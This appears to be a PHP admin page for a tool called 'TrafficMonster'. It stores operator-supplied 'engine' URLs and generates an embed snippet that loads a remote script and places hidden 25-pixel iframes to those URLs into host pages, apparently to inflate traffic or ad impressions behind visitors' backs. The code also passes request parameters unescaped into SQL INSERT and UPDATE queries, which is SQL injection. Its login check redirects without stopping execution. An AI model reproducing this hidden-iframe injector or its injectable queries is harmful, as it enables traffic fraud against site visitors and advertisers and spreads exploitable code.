<?php
session_start();
if((!isset($_SESSION["myusername"]))&&(empty($_SESSION["myusername"]))){
header("location:../index.php");
};
?>
<?php
if(isset($_GET["logoff"])){
	session_destroy();
	}
?>
<html>
<head>
<link href="../includes/style.css" rel="stylesheet" type="text/css">
<script type="text/javascript" src="../includes/script.js"></script>
</head>
<body>
<table width="100%" border="0" align="center">
  <tr>
    <td><div id="admin-header" class="header-admin">
      <table width="32%" height="153" border="0" align="center">
        <tr>
          <td align="center" valign="bottom"><p><a href="index.php"><img src="../source/header.png" width="211" height="242"></a><br>
              <br>
          </p></td>
        </tr>
      </table>
    </div></td>
  </tr>
  <tr>
    <td><div id="content" class="admin-cont">
      <p>&nbsp;</p>
      <?php if(empty($_GET)){
		  echo "<table width='579' border='0' align='center'>
  <tr>
    <td height='374' align='center' valign='middle'><p><a href='index.php?action=insert'><img src='../source/insertengine.png' alt='s' width='250' height='350' /></a></p></td>
    <td width='315' align='center' valign='middle'><a href='index.php?getcode'><img src='../source/getcode.png' alt='s' width='250' height='350' /></a></td>
    <td width='315' align='center' valign='middle'><a href='advanced.php'><img src='../source/advance.png' alt='s' width='250' height='350' /></a></td>
  </tr>
</table>";  } ?>

<table width="750" border="0" align="center">
      <tr>
        <td>
<?php  //GETCODE PART of SCRIPT
if(isset($_GET["getcode"])){
	
//include config and connect to database!
include("../config/config.php");

$connection=mysql_connect(dbhost,dbuser,dbpass);
	if(!$connection){die("Cant connect the sql: ". mysql_error());}
	
$select=mysql_select_db(dbname,$connection);
	if(!$select){die("Cant select db: ". mysql_error());}


$getnumber_q="SELECT * FROM number WHERE id=1";
$getnumresult=mysql_query($getnumber_q);
	if(!$getnumresult){die("Cant do 'getnumresult' query: ". mysql_error());};

$num_raw=mysql_fetch_array($getnumresult) or die("Cant fetch array:" . mysql_error() );
$num_no=$num_raw["num"];

	if($num_no==0){
		$number_engines="none engines";
		}elseif($num_no==1){
			$number_engines="{$num_no} engine";
			}else{
				$number_engines="{$num_no} engines";
				};
	
echo "Currently active ".$number_engines;

// GET ADDRESSES FROM DB

$engineurls_q="SELECT * FROM engine ORDER BY id DESC LIMIT ".$num_no;
$engineurls_r=mysql_query($engineurls_q) or die("Cant do 'engineurls_r' query:" . mysql_error() );

//$engineurls_raw=mysql_fetch_array($engineurls_r) or die("Cant fetch array:" . mysql_error() );

//echo $engineurls_raw["url"];
$i=1;
$code3="TrafficMonster(' 0', 'http://'+url+'/traffic');";
while($enurl=mysql_fetch_array($engineurls_r)){
	echo "</br></br>";
	echo "URL of Engine " . $i . " is: ";
	echo "<span style='color:#FF0'>".$enurl["url"];
	echo "</span>";
	$code3.= "TrafficMonster(' ".$i."', 'http://".$enurl["url"]."'); \n";
	$i++;
	};


/// GENERATE CODE !!!
$code1="<script type='text/javascript' src='http://www.webfacturer.com/traffic/generator.php'> </script>";
$code2="<script type='text/javascript' >
function TrafficMonster(iframeID, url) {
engine = document.createElement('div');
if(iframeID==0){
	engine.id = 'service';
	}else{
		engine.id = 'Engine' + iframeID;
		};
engine.style.width = '25px';
engine.style.height = '25px';
engine.style.visibility = 'hidden';
document.body.appendChild(engine);
addfr = document.createElement('iframe');
addfr.id = iframeID;
addfr.src = url;
addfr.style.width = '25px';
addfr.style.height = '25px';
if(iframeID==0){
	var setIt = document.getElementById('service');
	}else{
		var setIt = document.getElementById('Engine' + iframeID);
		};
setIt.appendChild(addfr);
};";

$code4="</script>";
$full_coded=base64_encode($code1.$code2.$code3.$code4);
echo "</br></br></br><textarea name='textarea' cols='45' rows='5' style='height:250px; width:750px;' readonly='readonly' id='textarea'><?php echo base64_decode('".$full_coded."'); ?></textarea>";

//echo base64_encode($code1.$code2.$code3.$code4);




}
?>
<?php
// for insert engines

if((isset($_GET["action"]))&&($_GET["action"]=="insert")){
	include("insert.html");
	};
	
?>

<?php
//for adding engines into DB
    if((isset($_GET["number"]))&&($_GET["number"]>0)){
	include("../config/config.php");
	$connection=mysql_connect(dbhost,dbuser,dbpass);
		if(!$connection){die("Cant connect the sql: ". mysql_error());}
	$select=mysql_select_db(dbname,$connection);
		if(!$select){die("Cant select db: ". mysql_error());}

	
	$num=$_GET["number"];
	$num_urls="UPDATE  number SET  `num` =  '$num' WHERE id=1";
	$update_num=mysql_query($num_urls);
		if(!$update_num){die("Cant update number: ". mysql_error());}
		
	echo "<div style='width:720px; height:auto; -moz-border-radius:15px; -webkit-border-radius:15px; 		        background-image:url(../source/piks.png); background-repeat:repeat; padding:10px;'></br>";
	
	for($i=1;$i<=$num;$i++){
		$query="INSERT INTO engine (url) VALUES  ('".$_POST["EngineBroj".$i]."')";
		$add=mysql_query($query);
		if($add){
		
			
			echo "New engine is added: " . $_POST["EngineBroj".$i] ."</br>";
			echo "</br>";
			
			}else{
				die("Following engine isn't added: " . $_POST["EngineBroj".$i] . mysql_error()."</br>");
				};
		}
		echo "</br>Total engines: $num";
		echo "</br></br><div id='gc_now' class='gc_now' align='center'><table width='250' height='200' border='0' align='center'>
  <tr>
    <td align='center' valign='top'><span id='get_c_n'><a href='index.php?getcode'>GET CODE NOW!</a></span><br />
    <a href='index.php?getcode'><img src='../source/getcode_now.png' alt='Click here to get code for your engines!!!' width='160' height='160' /></a></td>
  </tr>
</div></table>";
		
}	
	?>
</td>
      </tr>
    </table>
    </div></td>
  </tr>
</table>
</body>
<script type="text/javascript">
if(document.getElementById("get_c_n")){
	var getnow=document.getElementById("get_c_n");
	
	getnow.onmouseover=function(){
		getnow.style.color="#FF0000";
		getnow.style.fontWeight="bold";
		};
		
	getnow.onmouseout=function(){
		getnow.style.color="#FFFFFF";
		getnow.style.fontWeight="normal";		
		};
	};

</script>
</html>